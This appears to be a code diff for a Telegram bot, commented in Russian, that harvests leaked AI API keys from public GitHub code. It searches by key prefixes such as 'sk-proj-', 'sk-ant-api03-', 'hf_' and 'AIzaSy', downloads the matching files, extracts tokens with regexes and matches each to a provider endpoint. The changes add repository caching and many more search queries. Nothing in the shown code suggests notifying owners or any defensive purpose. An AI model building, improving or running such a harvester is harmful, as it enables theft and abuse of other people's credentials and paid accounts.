@@ -7,6 +7,7 @@ import requests
 import logging
 import asyncio
 import random
+import json
 from concurrent.futures import ThreadPoolExecutor
 
 from telegram import Update
@@ -69,6 +70,41 @@ REPO_HINTS = {
 
 # ─── БАЗА ДАННЫХ (ТЕКСТОВЫЙ ФАЙЛ) ──────────────────────────────────────────
 dead_keys_set = set() 
+
+# ─── КЭШ РЕПОЗИТОРИЕВ И СТРАНИЦ GITHUB ────────────────────────────────────
+github_seen_repos = set()
+github_pages = {}
+
+def init_github_cache():
+    global github_seen_repos, github_pages
+
+    # Загружаем проверенные репозитории
+    if os.path.exists('github_seen_repos.txt'):
+        with open('github_seen_repos.txt', 'r', encoding='utf-8') as f:
+            github_seen_repos = set(line.strip() for line in f if line.strip())
+
+    # Загружаем последние страницы
+    if os.path.exists('github_pages.json'):
+        try:
+            with open('github_pages.json', 'r', encoding='utf-8') as f:
+                github_pages = json.load(f)
+        except Exception:
+            github_pages = {}
+
+    logger.info(f"🗂 GitHub cache: {len(github_seen_repos)} репозиториев, {len(github_pages)} запросов со страницами.")
+
+def save_github_pages():
+    try:
+        with open('github_pages.json', 'w', encoding='utf-8') as f:
+            json.dump(github_pages, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        logger.error(f"❌ Ошибка сохранения github_pages.json: {e}")
+
+def mark_repo_seen(repo):
+    if repo not in github_seen_repos:
+        github_seen_repos.add(repo)
+        with open('github_seen_repos.txt', 'a', encoding='utf-8') as f:
+            f.write(f"{repo}\n")
 
 def init_db():
     global dead_keys_set
@@ -182,105 +218,151 @@ def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
     
+    # Расширенный список запросов
     queries = [
-        "sk-proj- language:Python", "sk-ant-api03- language:Python", 
-        "sk-kimi- language:Python", "sk-cp- language:Python",
-        "sk-sp- language:Python", "hf_ language:Python",
+        "sk-proj- language:Python", "sk-proj- language:JavaScript", "sk-proj- language:TypeScript",
+        "sk-proj- language:Go", "sk-proj- language:Rust", "sk-proj- language:Java",
+        "sk-proj- language:PHP", "sk-proj- language:Ruby",
+        "sk-ant-api03- language:Python", "sk-ant-api03- language:JavaScript",
+        "hf_ language:Python", "hf_ language:JSON", "hf_ language:YAML",
+        "sk-kimi- language:Python", "sk-cp- language:Python", "sk-sp- language:Python",
         "\"gsk_\" language:Python", "\"pplx-\" language:Python", "\"AIzaSy\" language:Python",
-        "\"sk-\" language:JSON", "\"sk-\" language:YAML", "\"sk-\" language:JavaScript"
+        "\"sk-\" language:JSON", "\"sk-\" language:YAML", "\"sk-\" language:JavaScript",
+        "\"sk-\" language:Go", "\"sk-\" language:Rust"
     ]
     query = random.choice(queries)
-    page = random.randint(1, 10) 
-    
+
+    # Берём сохранённую страницу для этого запроса, по умолчанию 1
+    page = github_pages.get(query, 1)
+    if page < 1 or page > 20:
+        page = 1
+
     try:
-        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 50, "page": page}, timeout=15)
-        if resp.status_code == 403: 
+        resp = requests.get(
+            "https://api.github.com/search/code",
+            headers=headers,
+            params={"q": query, "per_page": 50, "page": page},
+            timeout=15
+        )
+
+        if resp.status_code == 403:
             logger.error("❌ GitHub 403: Лимит поиска или неверный токен.")
             return []
+
         resp.raise_for_status()
-        
         items = resp.json().get("items", [])
-        logger.info(f"📄 Найдено файлов на странице {page}: {len(items)}")
-        
+        logger.info(f"📄 {query} | страница {page} | файлов: {len(items)}")
+
+        # Обновляем страницу для следующего раза
+        if len(items) > 0:
+            next_page = page + 1 if page < 20 else 1
+            github_pages[query] = next_page
+            save_github_pages()
+
         targets = []
         for i, item in enumerate(items[:20], 1):
             repo, path = item["repository"]["full_name"], item["path"]
+
+            # Пропускаем репозитории, которые уже проверяли
+            if repo in github_seen_repos:
+                logger.info(f"   └ [{i}/{min(len(items), 20)}] ⏭ Пропускаю уже проверенный {repo}")
+                continue
+
             logger.info(f"   └ [{i}/{min(len(items), 20)}] Скачиваю {repo}...")
-            
+
             try:
-                file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5, stream=True)
+                file_resp = requests.get(
+                    f"https://api.github.com/repos/{repo}/contents/{path}",
+                    headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"},
+                    timeout=5,
+                    stream=True
+                )
                 if file_resp.status_code != 200:
                     continue
-                    
+
                 content_length = file_resp.headers.get('content-length')
                 if content_length and int(content_length) > 100_000:
                     logger.info(f"      ⏩ Пропускаю большой файл ({(int(content_length)//1024)} КБ)")
+                    mark_repo_seen(repo)
                     continue
-                    
+
                 text = file_resp.content.decode('utf-8', errors='ignore')
             except requests.RequestException:
                 continue
-                
+
+            # Помечаем репозиторий как проверенный
+            mark_repo_seen(repo)
+
             lines = text.split('\n')
             for line in lines:
                 for p in KEY_PATTERNS:
                     for match in p["regex"].finditer(line):
                         token = match.group(0)
-                        
+
                         if p["provider"] == "generic-sk":
                             if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]):
                                 continue
-                                
+
                         api_urls = []
-                        
-                        # ПРИОРИТЕТ 1: URL в этой же строке
+
+                        # 1. URL в строке
                         for u in URL_REGEX.findall(line):
-                            if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
-                            
-                            # Умная обрезка: сначала v1, потом api
+                            if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']):
+                                continue
                             match_url = re.search(r'(.*?/v\d+(?:beta\d*)?)', u)
                             if not match_url:
                                 match_url = re.search(r'(.*?/api)', u)
-                            if match_url: api_urls.append(match_url.group(1))
-                        
-                        # ПРИОРИТЕТ 2: Префикс ключа
+                            if match_url:
+                                api_urls.append(match_url.group(1))
+
+                        # 2. Префикс ключа
                         if not api_urls and p["provider"] != "generic-sk":
                             api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
-                        
-                        # ПРИОРИТЕТ 3: Конфиги репо (Trees API)
+
+                        # 3. Конфиги репозитория
                         if not api_urls:
                             api_urls.extend(get_urls_from_repo_configs(repo)[:1])
-                        
-                        # ПРИОРИТЕТ 4: Переменная
+
+                        # 4. Переменная
                         if not api_urls:
                             var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
                             var_name = var_match.group(1).lower() if var_match else ""
                             for hint, url in REPO_HINTS.items():
-                                if hint in var_name: api_urls.append(url); break
+                                if hint in var_name:
+                                    api_urls.append(url)
+                                    break
                             if not api_urls:
-                                if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
-                                elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
-                        
-                        # ПРИОРИТЕТ 5: Имя репо
+                                if "openai" in var_name:
+                                    api_urls.append(PROVIDER_ENDPOINTS["openai"])
+                                elif "anthropic" in var_name:
+                                    api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
+
+                        # 5. Имя репозитория
                         if not api_urls:
                             combined = (repo + " " + path).lower()
                             for hint, url in REPO_HINTS.items():
-                                if hint in combined: api_urls.append(url); break
-                                
-                        # ПРИОРИТЕТ 6: Дефолт
+                                if hint in combined:
+                                    api_urls.append(url)
+                                    break
+
+                        # 6. Дефолт
                         if not api_urls:
                             api_urls.append(PROVIDER_ENDPOINTS["default"])
-                            
+
                         for url in list(set(api_urls))[:1]:
-                            if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
-            time.sleep(0.2) 
-            
+                            if url:
+                                targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+
+            time.sleep(0.2)
+
         unique_targets, seen = [], set()
         for t in targets:
             sig = f"{t['key']}_{t['endpoint']}"
-            if sig not in seen: seen.add(sig); unique_targets.append(t)
-            
-        logger.info(f"✅ Парсинг завершен. Найдено целей: {len(unique_targets)}")
+            if sig not in seen:
+                seen.add(sig)
+                unique_targets.append(t)
+
+        logger.info(f"✅ GitHub: найдено целей: {len(unique_targets)}")
         return unique_targets
     except Exception as e:
         logger.error(f"❌ Ошибка GitHub: {e}")
@@ -380,6 +462,7 @@ def format_report(key, endpoint, models, probes):
 # ─── ГЛАВНЫЙ ЦИКЛ ──────────────────────────────────────────────────────────
 async def long_scan_loop():
     init_db()
+    init_github_cache()
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     start_time = time.time()
     cycle_start_time = time.time()
